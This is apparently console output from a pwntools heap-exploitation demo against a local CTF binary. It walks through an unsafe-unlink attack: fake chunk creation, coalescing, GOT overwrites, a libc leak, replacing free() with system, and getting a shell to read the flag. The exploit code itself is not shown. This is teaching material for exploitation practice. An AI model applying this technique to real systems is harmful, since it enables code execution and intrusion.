```
python3 pwn-unsafe-unlink.py BIN=./chapter1_patched
[*] '/demos/unsafe-unlink-demo/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/demos/unsafe-unlink-demo/chapter1_patched': pid 4966
[*] Allocated Initial (5) Chunks.
[*] Paused (press any to continue)
[*] Made Fake Chunk Inside Chunk (3)
[*] Paused (press any to continue)
[*] Freed Chunk (4), causing colescing of Chunks (3,4) into Larger Chunk.
[*] Paused (press any to continue)
[*] Edited chunk 3 to pt to strlen got
[*] Paused (press any to continue)
[*] Edited chunk 0 to pt to puts plt
[*] Paused (press any to continue)
[*] Edited chunk 3 to pt to free got
[*] Paused (press any to continue)
[+] Free Leak: 0x7f9d394614f0
[+] Libc base: 0x7f9d393dd000
[*] Paused (press any to continue)
[*] free() replaced with System
[*] Paused (press any to continue)
[*] Allocated Chunk (4) with /bin/sh; call free(4) for shell
[*] Paused (press any to continue)
[*] Freed, Chunk (4) - trigggering system
[*] Switching to interactive mode
 $ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```